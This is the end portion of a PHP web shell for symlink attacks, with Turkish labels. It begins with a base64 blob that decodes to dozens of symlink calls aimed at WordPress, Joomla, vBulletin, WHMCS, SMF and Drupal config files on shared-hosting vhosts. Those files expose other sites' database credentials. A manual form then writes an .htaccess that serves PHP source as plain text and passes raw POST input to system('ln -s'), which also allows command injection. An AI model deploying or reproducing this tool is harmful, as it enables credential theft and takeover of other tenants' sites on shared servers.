3MvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLW1lbWJlcnMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1mb3J1bS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25mLnBocCcsJHNpdGVzcy4nLTUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYWRtaW4vY29uZmlnLnBocCcsJHNpdGVzcy4nLTQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtV1AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd3AvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1wcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd29yZHByZXNzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbmV3cy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AxMy1uZXcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmxvZy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1ibG9ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob21lL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtcHJvdGFsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NpdGUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC10ZXN0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FyY2FkZS9mdW5jdGlvbnMvZGJjbGFzcy5waHAnLCRzaXRlc3MuJy1pYnByb2FyY2FkZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtcHJvdGFsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvby9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvby50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtY21zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1uZXcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12Yn5jb25maWcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12YjN+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy12YjF+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1pbmNsdWRlcy12Yi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdHJhaWRudDEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLnBocCcsJHNpdGVzcy4nLTRpbWFnZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRzaXRlc3MuJy1EcnVwYWwudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWVtYmVyL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictMW1lbWJlci50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictYmlsbGluZ3MudHh0JykgOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9yZXF1aXJlcy9jb25maWcucGhwJywkc2l0ZXNzLictQU00U1MtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnQvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWJpbGxpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZ3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0aW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0YmlsbHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0KfQ0KcHJpbnQgIjxjZW50ZXI+PGEgdGFyZ2V0PSdfX25ld2JsYW5rJyBocmVmPSd2aG90cy1zw7Ztw7xyw7xsZMO8Mi9yb290Lyc+PHE+Um9vdDwvcT48L2E+PC9jZW50ZXI+PGhyPjxjZW50ZXI+PGEgdGFyZ2V0PSdfX19uZXdibGFuaycgaHJlZj0ndmhvdHMtc8O2bcO8csO8bGTDvDIvc3ltbGlua2xlci8nPjxxPlN5bWxpbmtsZXI8L3E+PC9hPjwvY2VudGVyPiI7";
    $dosya = fopen("vvv.cin" ,"w+");
    $yaz = fwrite ($dosya ,base64_decode($vhost));
    fclose($yaz);
    chmod("vhosts.cin",0755);
    unset($vhost);
    unset($dosya);
    unset($yaz);
    echo("<center><a target='__newblank' href='vhots-sömürüldü2/root'><q>Root</q></a></center>");
    echo("<hr>");
    echo("<center><a target='___newblank' href='vhots-sömürüldü2/symlinkler/'><q>symlinkler</q></a></center>");
}
?>

<center>
<div>
<font size="5" face="Impact"><sym>Manuel Symlink</sym></font>
<form method="post" name="sym_manuel">
<yesil class="yesil">Symlink Çeklicek Dosya:<input class="yesil" type="text" method="post" name="sym"></input></yesil><br><br>
<yesil class="yesil">Symlink İsimi:<input type="text" class="yesil" method="post" name="isim"></input><br><br></yesil>
<input value="Çek" name="çek"  mothod="post" type="submit" class="button">
</form>
<?php
if(isset($_POST['çek'])){
    mkdir("manuel_sömürüldü");
    chdir("manuel_sömürüldü");
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$hta);
    $o = $_POST['sym'];
    $a = $_POST['isim'];
    system("ln -s {$o} {$a}");
    $aa = $_POST['isim']."_DİĞER";
    symlink($o,$aa);
    echo("<center><a target='__newblank' href='manuel_sömürüldü/{$a}/'><q>Symlink</q></a></center>");
    echo("<hr>");
    echo("<center><a target='___newblank' href='manuel_sömürüldü/{$aa}/'><q>Symlink</q></a></center>");
    unset($a);
    unset($aa);
    unset($o);
}
?>
</div>
<alabörü>Bu yazılım AlabörüTim tarafından geliştirilmiştir</alabörü>